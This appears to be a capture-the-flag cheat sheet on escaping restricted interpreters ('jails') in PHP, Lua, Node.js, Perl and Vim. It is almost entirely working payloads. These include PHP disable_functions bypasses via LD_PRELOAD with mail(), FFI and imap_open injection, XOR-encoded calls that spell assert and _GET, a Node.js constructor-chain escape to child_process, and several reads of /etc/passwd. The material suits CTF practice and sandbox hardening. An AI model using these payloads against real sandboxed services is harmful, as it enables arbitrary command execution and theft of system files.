# Other Language Jail Escapes

Jail escapes beyond Python and Bash — PHP, Lua, JavaScript, Perl, and Vim.

## PHP Jail
**When**: Restricted `eval()`/`assert()` with `disable_functions` or character filters.

### Bypass disable_functions
```php
// If mail() is available: LD_PRELOAD injection
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a","b","c","d");
// evil.so's constructor runs with mail()'s child process
// Compile: gcc -shared -fPIC -o evil.so -x c - <<< 'void __attribute__((constructor)) x(){ system("id > /tmp/out"); }'
```

```php
// If FFI is available (PHP 7.4+):
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id");
```

```php
// If imap_open is available:
imap_open("{localhost/imap}INBOX", "", "", 0, 1, array("DISABLE_AUTHENTICATOR" => "x]]\nx]]\n. NOOP\n0 LOGOUT\nshell\n"));
```

### Character Filter Bypass
```php
// XOR to construct strings:
("phpinfo")();  // if direct call works
// If characters blocked, XOR known strings:
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // assert
$__='_'.('%07'^'@').('%05'^'@').('%14'^'@'); // _GET
$$__[_]($$__[__]); // $_GET[_]($_GET[__]) → arbitrary function call
```

### Numeric-Only PHP
```php
// PHP has dynamic function calls:
(36^95)  // = 'system'... no, use chr() chains
$a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a('id');
```

## Lua Jail
**When**: Restricted Lua sandbox — `os` and `io` libraries removed.

```lua
-- Access os via debug library (if available)
debug.getregistry()  -- contains references to all loaded modules
-- Or traverse _G (global table) for hidden references

-- String to function:
loadstring("os.execute('id')")()  -- if loadstring isn't blocked

-- Coroutine-based escape:
-- Some sandboxes forget to remove coroutine.wrap + debug access

-- If only print is available:
-- Use error messages to leak information
pcall(function() error(io.open("/etc/passwd"):read("*a")) end)
```

## JavaScript (Node.js) Jail
**When**: `eval()` or `Function()` sandbox without vm2 — raw restriction via scope limiting.

```javascript
// Escape via constructor chain:
[].constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()

// this.constructor shortcut:
this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")

// arguments.callee.caller access (non-strict mode):
(function(){return arguments.callee.caller.constructor("return process")()})()

// If eval is available but require isn't:
eval("process.mainModule.require('child_process').execSync('id').toString()")

// import() in ESM context:
import('child_process').then(m => m.execSync('id'))
```

## Perl Jail
**When**: Perl `Safe` module or restricted eval.

```perl
# Safe module bypass — access file operations via typeglob:
open(F, "/etc/passwd"); print <F>;

# If open is blocked:
# Use backticks or system via string eval
eval { `id` };

# Safe compartment escape via Opcode manipulation (old versions):
# The Safe module restricts opcodes — but some opcodes leak
```

## Vim Jail (Restricted Mode)
**When**: `vim -Z` (restricted mode) — no shell commands, no Python/Ruby/Lua interfaces.

```vim
" UIUCTF 2023 technique — Perl interface may still work:
:perl system("id")

" If Perl is also disabled:
" Use :source to load a file that wasn't anticipated
:source /path/to/writable/file_with_vim_commands

" Insert mode + filter:
!!sh      " filter current line through sh

" Ex mode tricks:
:!id      " blocked in -Z, but :py3 might work
:py3 import os; os.system('id')

" Read file without shell:
:r /etc/passwd
```

## Common Pattern
In ALL language jails, the approach is the same:
1. **Enumerate** what's available (which builtins, which modules, which characters).
2. **Find the escape vector** (constructor chain, debug library, FFI, interface to another language).
3. **Build the payload** around the specific filter (encoding, string construction, type coercion).
